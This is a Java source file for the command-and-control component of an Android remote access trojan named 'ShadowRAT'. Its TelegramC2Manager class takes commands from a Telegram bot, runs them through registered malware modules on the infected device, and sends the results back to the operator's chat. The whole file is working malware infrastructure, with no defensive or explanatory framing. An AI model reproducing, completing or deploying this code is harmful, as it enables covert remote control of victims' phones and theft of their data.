
package com.shadow.rat.c2;

import android.content.Context;
import com.shadow.rat.modules.Module;
import com.shadow.rat.persistence.ConfigManager;
import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.TelegramBotsApi;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
import org.telegram.telegrambots.updatesreceivers.DefaultBotSession;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public class TelegramC2Manager extends TelegramLongPollingBot implements C2Manager {

    private static TelegramC2Manager instance;
    private final String botToken;
    private final String chatId;
    private final Map<String, Module> modules = new HashMap<>();
    private CommandCallback commandCallback;

    private TelegramC2Manager(Context context) throws IOException {
        ConfigManager.loadConfig(context);
        this.botToken = ConfigManager.getProperty("BOT_TOKEN");
        this.chatId = ConfigManager.getProperty("CHAT_ID");
    }

    public static synchronized TelegramC2Manager getInstance(Context context) {
        if (instance == null) {
            try {
                instance = new TelegramC2Manager(context);
            } catch (IOException e) {
                e.printStackTrace();
                // Handle error loading config
            }
        }
        return instance;
    }

    @Override
    public void onUpdateReceived(Update update) {
        if (update.hasMessage() && update.getMessage().hasText()) {
            String messageText = update.getMessage().getText();
            if (commandCallback != null) {
                commandCallback.onCommandReceived(messageText);
            }
            String[] parts = messageText.split(" ", 2);
            String command = parts[0];
            String args = parts.length > 1 ? parts[1] : "";

            if (modules.containsKey(command)) {
                String result = modules.get(command).execute(args);
                sendMessage(result);
            }
        }
    }

    @Override
    public String getBotUsername() {
        return "ShadowRAT";
    }

    @Override
    public String getBotToken() {
        return botToken;
    }

    @Override
    public void startListening(CommandCallback callback) {
        this.commandCallback = callback;
        try {
            TelegramBotsApi botsApi = new TelegramBotsApi(DefaultBotSession.class);
            botsApi.registerBot(this);
        } catch (TelegramApiException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void registerModule(String command, Module module) {
        modules.put(command, module);
    }

    @Override
    public void sendMessage(String message) {
        SendMessage sendMessage = new SendMessage(chatId, message);
        try {
            execute(sendMessage);
        } catch (TelegramApiException e) {
            e.printStackTrace();
        }
    }
}
